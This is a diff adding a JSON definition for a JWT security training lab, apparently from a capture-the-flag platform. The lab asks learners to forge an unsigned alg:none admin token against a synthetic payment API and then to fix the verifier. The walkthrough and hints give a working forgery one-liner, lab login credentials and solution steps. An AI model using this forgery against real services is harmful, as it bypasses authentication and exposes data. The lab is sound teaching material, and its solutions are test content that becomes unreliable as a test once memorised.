@@ -1,0 +1,155 @@
+{
+  "schemaVersion": 1,
+  "id": "jwt-none-forge",
+  "version": "1.0.0",
+  "status": "published",
+  "title": "Unsigned Authority",
+  "subtitle": "Forge an admin token against Aurora Pay's JWT verifier",
+  "category": "API Security",
+  "difficulty": "Intermediate",
+  "estimatedMinutes": 28,
+  "skills": [
+    "JWT",
+    "alg:none",
+    "Token forgery",
+    "API authorization",
+    "Defensive configuration"
+  ],
+  "summary": "Aurora Pay issues HS256 partner tokens but its verifier trusts the algorithm named inside the token. Mint an unsigned admin token, read the merchant export, then close the flaw.",
+  "scenario": "You are assessing the Aurora Pay partner API. Tokens are standard HS256 JWTs, yet the verifier reads the algorithm from the token header instead of enforcing an allow-list. Prove the impact with an unsigned admin token, capture the export marker, and then make the verifier reject alg:none while keeping legitimate partner tokens working.",
+  "prerequisites": [
+    "Understanding of JWT structure",
+    "Comfort with base64url and curl"
+  ],
+  "learningObjectives": [
+    "Explain how trusting the JWT header algorithm enables forgery",
+    "Forge an unsigned admin token against a live API",
+    "Apply an allow-list policy and verify both denial and normal operation"
+  ],
+  "authorizedScope": "Only the Aurora Pay training API inside this session. Merchant data is synthetic.",
+  "riskSummary": "Accepting the token-supplied algorithm lets an unauthenticated attacker claim any role. Real-world variants allow key confusion and total authentication bypass.",
+  "remediation": "Pin the expected algorithm server-side, verify signatures with a constant-time comparison, reject unsigned tokens unconditionally, and validate claims such as iss/aud/exp.",
+  "conclusion": "You minted an unsigned admin JWT and exported merchant data, then fixed the verifier so unsigned tokens are rejected while correctly signed partner tokens still authenticate.",
+  "baseXp": 150,
+  "workspace": {
+    "image": "cipherforge/workspace:1.2.0",
+    "tools": [
+      "curl",
+      "jq",
+      "python3",
+      "labctl",
+      "base64"
+    ]
+  },
+  "services": [
+    {
+      "name": "api",
+      "role": "target",
+      "app": "jwt-none-forge/app/server.mjs",
+      "ports": [
+        {
+          "port": 8080,
+          "protocol": "http",
+          "published": true,
+          "name": "web"
+        }
+      ],
+      "health": {
+        "kind": "http",
+        "path": "/api/health",
+        "expectStatus": 200,
+        "expectBody": "aurorapay",
+        "timeoutSeconds": 30
+      },
+      "flagObjectives": [
+        "admin-export"
+      ]
+    }
+  ],
+  "resources": {
+    "cpus": 0.5,
+    "memoryMb": 320,
+    "pids": 96,
+    "writableDiskMb": 64,
+    "maxMinutes": 45,
+    "idleTimeoutMinutes": 20
+  },
+  "network": {
+    "outbound": "deny",
+    "internalPorts": [
+      8080
+    ]
+  },
+  "objectives": [
+    {
+      "id": "admin-export",
+      "title": "Forge an admin token",
+      "description": "Log in as the partner account, decode the JWT, then construct a token with alg=none and role=admin. Query the admin export endpoint with it and submit the marker inside the export note.",
+      "evidencePrompt": "Submit the CF{...} marker from the admin export.",
+      "validation": {
+        "type": "flag",
+        "objectiveKind": "flag",
+        "xp": 55
+      },
+      "hints": [
+        {
+          "id": "h1",
+          "text": "Log in with `curl -s -X POST -H 'content-type: application/json' -d '{\"email\":\"analyst@aurorapay.example\",\"password\":\"aurora2024\"}' $CF_TARGET_URL/api/login`.",
+          "xpPenalty": 5
+        },
+        {
+          "id": "h2",
+          "text": "A JWT is three base64url parts. Set the header to {\"alg\":\"none\",\"typ\":\"JWT\"} and the payload role to \"admin\", then keep a trailing dot for the empty signature.",
+          "xpPenalty": 10
+        }
+      ]
+    },
+    {
+      "id": "reject-none",
+      "title": "Reject unsigned tokens",
+      "description": "Enable the verifier policy that requires a signed algorithm. The live check submits an unsigned admin token (must be 401) and a genuine partner token (must be 403, not 401).",
+      "validation": {
+        "type": "check",
+        "objectiveKind": "check",
+        "xp": 70,
+        "validator": "alg-none-rejected",
+        "criteria": [
+          "unsigned token rejected with 401",
+          "signed partner token authenticates but is forbidden",
+          "token issuance still works"
+        ]
+      },
+      "hints": [
+        {
+          "id": "h1",
+          "text": "Apply `{\"rejectAlgNone\": true}` with `labctl policy apply -` and re-run the objective check.",
+          "xpPenalty": 5
+        }
+      ]
+    }
+  ],
+  "validators": [
+    "alg-none-rejected"
+  ],
+  "provisioner": {
+    "script": "jwt-none-forge/provision.mjs",
+    "timeoutSeconds": 45
+  },
+  "walkthrough": [
+    {
+      "title": "Get a legitimate token",
+      "body": "Log in as the partner account to see the real token shape.",
+      "snippet": "TOKEN=$(curl -s -X POST -H 'content-type: application/json' -d '{\"email\":\"analyst@aurorapay.example\",\"password\":\"aurora2024\"}' $CF_TARGET_URL/api/login | jq -r .token); echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null; echo"
+    },
+    {
+      "title": "Forge an unsigned admin token",
+      "body": "Claim the admin role with alg=none. The signature segment is empty.",
+      "snippet": "H=$(printf '{\"alg\":\"none\",\"typ\":\"JWT\"}' | base64 -w0 | tr '+/' '-_' | tr -d '='); P=$(printf '{\"sub\":\"x\",\"role\":\"admin\",\"exp\":9999999999}' | base64 -w0 | tr '+/' '-_' | tr -d '='); FORGED=\"$H.$P.\"; curl -s -H \"Authorization: Bearer $FORGED\" $CF_TARGET_URL/api/admin/export"
+    },
+    {
+      "title": "Fix the verifier",
+      "body": "Switch on the policy and confirm the unsigned token is rejected.",
+      "snippet": "echo '{\"rejectAlgNone\": true}' | labctl policy apply -"
+    }
+  ]
+}
